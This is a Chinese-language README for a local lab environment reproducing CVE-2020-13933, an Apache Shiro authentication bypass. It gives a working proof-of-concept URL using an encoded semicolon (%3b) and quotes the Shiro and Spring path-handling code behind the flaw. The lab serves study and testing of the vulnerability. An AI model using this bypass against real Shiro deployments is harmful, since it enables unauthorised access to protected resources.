# CVE-2020-13933 靶场

> shiro < 1.6.0 身份认证绕过漏洞

------

## PoC

[http://127.0.0.1:8080/res/%3bpoc](http://127.0.0.1:8080/res/%3bpoc)


## 靶场环境

![](https://img.shields.io/badge/JDK-1.8-brightgreen.svg) ![](https://img.shields.io/badge/Spring-2.3.3-brightgreen.svg) ![](https://img.shields.io/badge/Shiro-1.5.3-brightgreen.svg)


## 代码说明

- [`ShiroConfig.java`](/src/main/java/com/exp/cve/ShiroConfig.java)： 
<br/>　　权限配置， 当请求 `/res/*` 资源时， 302 跳转到登陆页面进行身份认证
- [`NameController.java`](/src/main/java/com/exp/cve/NameController.java)： 
<br/>　　· `/res/{name}`： 请求名为 `name` 的的资源（触发身份认证）
<br/>　　· `/res/`： 不请求任何资源（不触发身份认证）


## 靶场验证

不在请求路由中指定资源名称时，不触发身份验证，也无资源返回： [`http://127.0.0.1:8080/res/`](http://127.0.0.1:8080/res/)

![](/imgs/01.png)

在请求路由中指定资源名称时，302 跳转到身份验证页面： [`http://127.0.0.1:8080/res/poc`](http://127.0.0.1:8080/res/poc)

![](/imgs/02.png)

构造特定 PoC 请求指定资源时，不触发身份验证，并返回资源： [http://127.0.0.1:8080/res/%3bpoc](http://127.0.0.1:8080/res/%3bpoc) （`%3b` 是 `;` 的 URL 编码）

![](/imgs/03.png)


## 漏洞 DEBUG 位置

### shiro-web-1.5.3.jar

```java
// org.apache.shiro.web.util.WebUtils.java
// line 111

public static String getPathWithinApplication(HttpServletRequest request) {
    return normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));
}
```

### spring-web-5.2.5.RELEASE.jar

```java
// org.springframework.web.util.UrlPathHelper.java
// line 459

private String decodeAndCleanUriString(HttpServletRequest request, String uri) {
    uri = removeSemicolonContent(uri);
    uri = decodeRequestString(request, uri);
    uri = getSanitizedPath(uri);
    return uri;
}
```


